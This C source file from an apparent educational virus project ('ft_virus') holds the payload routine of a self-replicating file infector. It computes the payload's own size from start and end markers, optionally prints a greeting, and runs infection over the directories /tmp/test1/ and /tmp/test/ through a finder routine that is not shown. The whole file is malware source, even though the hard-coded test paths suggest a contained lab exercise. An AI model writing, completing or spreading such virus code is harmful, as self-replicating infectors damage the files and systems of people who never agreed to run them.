#include "ft_virus.h"

void infect_dir(t_data data, char *dir)
{
	int fd;
	fd = OPEN(dir, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		payload_end();
	finder(data, fd, dir);
	CLOSE(fd);
}

void payload(void)
{
	t_data data;
	int fd;
	int i;
	#ifdef __HELLO__
		char hello[] = "Hello there\n";

		WRITE(1, hello, sizeof(hello) - 1);
	#endif
	data.infos.pl_size = &payload_end - &payload_start;
	char dir1[] = "/tmp/test1/";
	char dir2[] = "/tmp/test/";
	infect_dir(data, dir1);
	infect_dir(data, dir2);
	return ;
}
